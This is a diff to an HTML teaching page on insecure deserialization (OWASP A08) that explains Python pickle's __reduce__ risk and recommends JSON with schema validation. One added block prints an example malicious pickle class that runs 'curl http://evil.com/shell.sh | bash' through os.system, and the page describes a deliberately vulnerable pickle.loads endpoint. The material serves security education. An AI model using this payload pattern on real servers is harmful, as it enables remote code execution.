@@ -5,9 +5,58 @@
 <section class="card">
     <h2>A08: Software or Data Integrity Failures — Insecure Deserialization</h2>
     <p class="hint">
-        Native serialization formats can restore object behavior, not just data.
-        This demo uses Python pickle in a harmless way to show the problem.
+        Serialization converts an in-memory object into a byte sequence for storage or transmission.
+        Deserialization reverses the process — it reconstructs a live object from bytes.
+        Many native serialization formats (Python pickle, Java ObjectInputStream, PHP unserialize)
+        do not just restore data: they <strong>restore object behavior</strong>.
+        If the serialized data comes from an untrusted source, an attacker can craft bytes that,
+        when deserialized, execute arbitrary code on the server.
     </p>
+</section>
+
+<section class="card">
+    <h2>Why Pickle Is Dangerous</h2>
+    <p class="hint">
+        Python's <code>pickle</code> format supports a special method <code>__reduce__</code>.
+        When an object is pickled, <code>__reduce__</code> can return a callable and its arguments.
+        During deserialization, <code>pickle.loads()</code> calls that callable automatically.
+    </p>
+    <div class="grid-2">
+        <div class="mode-box unsafe">
+            <p><strong>A malicious (real-world) pickle payload might encode:</strong></p>
+            <div class="query">class Exploit:<br>    def __reduce__(self):<br>        return (os.system, ("curl http://evil.com/shell.sh | bash",))<br><br>payload = pickle.dumps(Exploit())</div>
+            <p class="hint">
+                When the server calls <code>pickle.loads(payload)</code>, it executes
+                <code>os.system("curl http://evil.com/shell.sh | bash")</code> —
+                remote code execution with the web server's privileges.
+            </p>
+        </div>
+        <div class="mode-box safe">
+            <p><strong>This demo uses a harmless payload:</strong></p>
+            <div class="query">class DemoPayload:<br>    def __reduce__(self):<br>        return (harmless_demo_trigger, ())<br><br># harmless_demo_trigger just returns a dict<br># No OS calls, no network access</div>
+            <p class="hint">
+                The mechanism is identical to a real exploit — only the payload function differs.
+                In production, an attacker would substitute any callable that runs their code.
+            </p>
+        </div>
+    </div>
+</section>
+
+<section class="card">
+    <h2>Real-World Deserialization Vulnerabilities</h2>
+    <div class="table-wrap">
+        <table>
+            <thead>
+                <tr><th>Language / Format</th><th>Dangerous Function</th><th>Notable Incidents</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>Python (pickle)</td><td><code>pickle.loads()</code></td><td>Many CVEs in Flask session parsers, ML model servers</td></tr>
+                <tr><td>Java (ObjectInputStream)</td><td><code>ObjectInputStream.readObject()</code></td><td>Apache Commons Collections gadget chain; Jenkins RCE</td></tr>
+                <tr><td>PHP</td><td><code>unserialize()</code></td><td>Drupal, Joomla, WordPress plugin RCEs</td></tr>
+                <tr><td>Ruby (Marshal)</td><td><code>Marshal.load()</code></td><td>Rails YAML/Marshal deserialization CVEs</td></tr>
+            </tbody>
+        </table>
+    </div>
 </section>
 
 <div class="grid-2">
@@ -15,22 +64,64 @@
         <h2>1. Serialized Input</h2>
 
         <div class="form-stack">
-            <button onclick="generatePayload()">Generate Demo Payload</button>
-            <button onclick="sendVulnerable()">Send to Vulnerable Endpoint</button>
-            <button onclick="sendSafe()">Send to Safe Endpoint</button>
+            <button onclick="generatePayload()">▶ Generate Demo Payload</button>
 
             <label>
-                Payload
-                <textarea id="pickle-payload" rows="7" placeholder="Generated pickle payload appears here..."></textarea>
+                Payload (Base64-encoded pickle)
+                <textarea id="pickle-payload" rows="7" placeholder="Click 'Generate Demo Payload' to begin..."></textarea>
             </label>
+
+            <div class="grid-2">
+                <button onclick="sendVulnerable()">❌ Deserialize (Unsafe)</button>
+                <button onclick="sendSafe()">✅ Parse as JSON (Safe)</button>
+            </div>
         </div>
+
+        <p class="hint" style="margin-top: 12px;">
+            The unsafe endpoint calls <code>pickle.loads()</code> on whatever you send.
+            The safe endpoint calls <code>json.loads()</code> — which only restores data,
+            never object behavior.
+        </p>
     </section>
 
     <section class="card">
         <h2>2. Result</h2>
-        <pre id="pickle-result" class="query wrap">Click “Generate Demo Payload” to begin.</pre>
+        <pre id="pickle-result" class="query wrap">Click "Generate Demo Payload" to begin.</pre>
+
+        <div class="mode-box" style="margin-top: 16px;">
+            <p><strong>What to observe:</strong></p>
+            <ul class="hint" style="margin: 0; padding-left: 1.2em;">
+                <li>Generate the payload and inspect its Base64 contents</li>
+                <li>Send to the <strong>unsafe</strong> endpoint — the server executes the embedded function</li>
+                <li>Send the same payload to the <strong>safe</strong> endpoint — it rejects it because pickle bytes are not valid JSON</li>
+            </ul>
+        </div>
     </section>
 </div>
+
+<section class="card">
+    <h2>Why JSON Is Safer</h2>
+    <div class="grid-2">
+        <div class="mode-box unsafe">
+            <p><span class="pill pill-red">Native serialization (pickle, ObjectInputStream)</span></p>
+            <ul class="hint" style="margin: 0; padding-left: 1.2em;">
+                <li>Restores class instances and their behavior</li>
+                <li>Executes __reduce__, __init__, and lifecycle methods on deserialization</li>
+                <li>Any callable on the server can be invoked by crafting the right bytes</li>
+                <li>Deserialization happens before any validation can run</li>
+            </ul>
+        </div>
+        <div class="mode-box safe">
+            <p><span class="pill pill-green">Data-only formats (JSON, MessagePack, Protocol Buffers)</span></p>
+            <ul class="hint" style="margin: 0; padding-left: 1.2em;">
+                <li>Restores only data: strings, numbers, booleans, lists, objects</li>
+                <li>No code is executed during parsing</li>
+                <li>The application reads values and constructs objects itself — under its own control</li>
+                <li>Schema validation can run on parsed data before it is used</li>
+            </ul>
+        </div>
+    </div>
+</section>
 
 <section class="card">
     <h2>Teaching Point</h2>
@@ -39,11 +130,16 @@
         <div class="mode-box unsafe">
             <p><span class="pill pill-red">Wrong</span></p>
             <div class="query">pickle.loads(untrusted_input)</div>
+            <p class="hint">This is equivalent to executing code the attacker sent you.</p>
         </div>
 
         <div class="mode-box safe">
             <p><span class="pill pill-green">Better</span></p>
-            <div class="query">Use plain data formats and validate structure.</div>
+            <div class="query">data = json.loads(input)<br>obj = MyClass(data["field"])  # you construct it</div>
+            <p class="hint">
+                Use data-only formats. Validate schema after parsing.
+                If you must deserialize native objects, use an allowlist of permitted types.
+            </p>
         </div>
     </div>
 </section>
